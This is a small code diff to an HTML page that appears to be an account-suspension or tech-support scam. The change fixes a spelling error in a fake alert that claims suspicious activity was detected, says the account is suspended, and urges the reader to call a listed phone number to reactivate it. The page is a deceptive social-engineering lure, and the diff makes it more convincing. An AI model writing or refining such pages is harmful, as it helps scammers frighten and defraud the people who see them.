@@ -71,7 +71,7 @@ ul li{
             
             <center><img src="download.png" class="img-responsive" style="margin-top: 5%; width: 120px;"></center>
       <div class="form-group">
-             <div id="result"><ul><li>A suspicious activity has been detected on your account. Due to security reasins we have temporarily suspended your account<br>
+             <div id="result"><ul><li>A suspicious activity has been detected on your account. Due to security reasons we have temporarily suspended your account<br>
  				Please call on <a>+1-888-318-0759</a> to reactivate your account</li> </ul>
           </div>
        <div class="form-group">
